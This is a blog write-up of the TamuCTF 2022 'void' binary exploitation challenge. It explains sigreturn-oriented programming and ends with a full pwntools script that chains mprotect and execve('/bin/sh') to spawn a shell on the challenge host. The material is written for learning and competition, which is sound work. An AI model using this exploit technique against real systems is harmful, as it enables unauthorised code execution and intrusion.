---
title:  "[TamuCTF 2022] void [SROP]"
date: 2022-04-25 10:12:50
author: aynakeya
---

# Background

In recently ctf (tamuctf 2022), I solve a challenge called **void**. 

This challenge only contains a few line of assembly code, with no libc and NX enabled.

The only thing we can utilize is a buffer overflow and some syscall gadget. 

It seems impossible to do. However, there is a technique call **SROP - Sigreturn Oriented Programming** that can help us to pwn this binary.

# Theory

The original paper is here [paper](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf), [slides](https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf)

Check it out if you want to.

I'll brief explain how SROP works.

## Before

[syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)


## Introduce to syscall - rt_sigreturn

Here is a picture showing how linux kernel handle signaling.

![signal-handling-context.png](/assets/images/tamuctf2022/signal-handling-context.png)

rt_sigreturn is a syscall the will be called when program come back from signal handler. 

Since signal handler may change registers, before the program going to signal handler, the program will save current (which is called **Signal Frame**) state including all the register on the stack.

![2022-04-17_224058.png](/assets/images/tamuctf2022/2022-04-17_224058.png)

Then, after the program come back from signal handler, progrma will use syscall **rt_sigreturn** to recover register and continue running.

That said, if we can fake **Signal Frame** on the stack, then call **rt_sigreturn**.  we can set register to what ever value we want.

And here is what **signal frame** looks like in linux x86-64. (detail [here](https://github.com/torvalds/linux/blob/master/arch/x86/include/uapi/asm/sigcontext.h))

![signal_frame.png](/assets/images/tamuctf2022/signal_frame.png)

## How to trigger sigreturn in the first place.

In order to trigger sigreturn and do a srop, the binary should satisfy following criteria

1. Knowing the address of `syscall; ret`
2. A big enough buffer overflow or something that allow us to write signal frame on the stack
3. some how control the value rax

first and second criteria are easy to spot or identify. For setting the value in rax, there are multiple way to do that.

1. using `pop rax; ret`
2. using function a function return value (rax is used for function return)
3. using syscall read (syscall read will return how many bytes read)


## Getting a shell using SROP

To get a shell, we need to execute `execve('/bin/sh',0,0)` by calling `syscall`

So, despite all the requirements describe above. We also need an address for `/bin/sh`.

If we have a buffer overflow or something, we either write `/bin/sh` into stack, or we can contruct a rop chain that write `/bin/sh` some where in the memory.

Pretty Straightforward

# Solving Void


## Analyze

Examining the code, the program only contains following codes. Basicly, the program call `main` and read 2000 bytes to the stack, then exit.

```
┌ 27: int main (int argc, char **argv, char **envp);
│           0x00401000      48c7c0000000.  mov rax, 0                  ; [02] -r-x section size 56 named .text
│           0x00401007      48c7c7000000.  mov rdi, 0
│           0x0040100e      4889e6         mov rsi, rsp
│           0x00401011      48c7c2d00700.  mov rdx, 0x7d0              ; 2000
│           0x00401018      0f05           syscall
└           0x0040101a      c3             ret
            0x0040101b      0f1f440000     nop dword [rax + rax]
┌ 24: entry0 (int argc, char **argv, char **envp);
│           0x00401020      31c0           xor eax, eax
│           0x00401022      e8d9ffffff     call main                   ; int main(int argc, char **argv, char **envp)
│           0x00401027      48c7c03c0000.  mov rax, 0x3c               ; '<' ; 60
│           0x0040102e      48c7c7000000.  mov rdi, 0
│           0x00401035      0f05           syscall
└           0x00401037      c3             ret
```

And there is no writable memory page except the stack.

```
0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- void void ; segment.ehdr
0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x void void ; map.void.r_x
0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- void void ; map.void.r__
0x00007ffe3e60d000 - 0x00007ffe3e62e000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_
0x00007ffe3e64f000 - 0x00007ffe3e653000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__
0x00007ffe3e653000 - 0x00007ffe3e654000 - usr     4K s r-x [vdso] [vdso] ; map._vdso_.r_x
```

So, how to use **SROP** to get a shell? Lets think reversely.

In the end, we want to get a shell, so we must use `syscall(59,'/bin/sh',0,0)`. But '/bin/sh' is not in the memory. So, we need to write '/bin/sh' into the memory.

We can simply write '/bin/sh' on the stack, **however**, there is no way we are able to know the stack address. (In this case, rdi never gonna be 1, so we can't use `write(1,addr,0x7df)` to get stack address)

Here is another method, first, we do a `mprotect` to make a memory page writable using sigreturn. After sigreturn, rsp (stack pointer) will set to the address now is writable. 

Then we return to `main` function and write '/bin/sh' and signal frame for calling `syscall(59,'/bin/sh',0,0)` there. In that case, we know the address of '/bin/sh'.

Now, how to trigger sigreturn? thats pretty straightforward, Since we have a write syscall in main, we just write 15 bytes to the stack and return to syscall gadget. That will set rax to 15 and trigger sigreturn.

There one more thing. Since we are using the gadget `syscall; ret`. After we execute `mprotect`, the program will ret to a address in the rsp. 

```
Before sigreturn

registers: rax = 15, rsp = 0xffff1000

syscall <- rip
ret

----
fake signal frame <- rsp = 0xffff1000
rsp = some value(eg. 0xffff4000)
rax = 10
rip = syscall address
....
----

=======================================

After sigreturn

registers: rax = 10, rsp = 0xffff4000

syscall <- rip # this syscall the do mprotect
ret

----
unknown stuff <- rsp = 0xffff4000
----

=======================================

syscall
ret  <- rip 

----
unknown stuff <- rsp = 0xffff4000
----
```

Its okay if we end after one sigreturn. But in this case, we need to do two sigreturn, so it is important to return back to `main`. Therefore, we need find some where in the memory that contains an pointer to `main`, so that when `ret` is called, it will go back to `main` and we can do another SROP there.

Luckily, in `0x004020b8`, there is pointer that point to `main`. So we can happily make whole `0x00402000-0x00403000` page writable and use this address as our new rsp.

## Summary

1. write signal frame to the stack with rax=10 (mprotect), rdi = 0x00402000, rsi = 0x1000, rdx = 7 (rwx), rsp = 0x004020b8, rip = syscall addr. Then return to main
2. write 15 bytes to trigger sigreturn
3. syscall `mprotect(0x00402000,0x1000,7)`
4. return to main, write signal frame for calling execve. Then return to main
5. write 15 bytes to trigger sigreturn
6. syscall `execve('/bin/sh',0,0)` to get a shell

## Exploit

```
from pwn import *


class BinaryInfo:
    exe = "void"
    libc = ""

    host = "rua.host.goes.here"
    port = 8000


exe = context.binary = ELF(BinaryInfo.exe)
exe_rop = ROP(exe)
if BinaryInfo.libc != "":
    libc = ELF(BinaryInfo.libc)
    libc_rop = ROP(libc)
else:
    libc = None
    libc_rop = None

host = args.HOST or BinaryInfo.host
port = int(args.PORT or BinaryInfo.port)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = remote("tamuctf.com", 443, ssl=True, sni="void")
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
#    Arch:     amd64-64-little
#    RELRO:    No RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)


io = start()

# rax syscall x64
# 0   read
# 1   write
# 15  rt_sigreturn
# 59  execve

main_addr = exe.sym["main"]
syscall_ret_addr = 0x00401018
fake_rwx_stack_addr = 0x004020b8


mprotect_frame = SigreturnFrame()
mprotect_frame.rip = syscall_ret_addr # return to main and do other thing
mprotect_frame.rsp = fake_rwx_stack_addr
mprotect_frame.rax = constants.SYS_mprotect
mprotect_frame.rdi = 0x00402000
mprotect_frame.rsi = 0x1000
mprotect_frame.rdx = 7 # rwx

do_mprotect = flat({
    0:[
        main_addr,
        syscall_ret_addr,
        bytes(mprotect_frame)
    ]
})

input("send mprotect payload")
io.send(do_mprotect) # set up sigreturn frame
input("trigger sigreturn and mprotect")
io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn


execve_bin_sh_frame = SigreturnFrame()
execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing
execve_bin_sh_frame.rsp = fake_rwx_stack_addr # 
execve_bin_sh_frame.rax = constants.SYS_execve
execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat({0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]}))
execve_bin_sh_frame.rsi = 0
execve_bin_sh_frame.rdx = 0

do_execve_bin_sh = flat({
    0:[
        main_addr,
        syscall_ret_addr,
        bytes(execve_bin_sh_frame),
        b"/bin/sh\x00",
    ]
})


input("send execve bin/sh payload")
io.send(do_execve_bin_sh) # set up sigreturn frame
input("trigger sigreturn and mprotect")
io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn

io.interactive()
```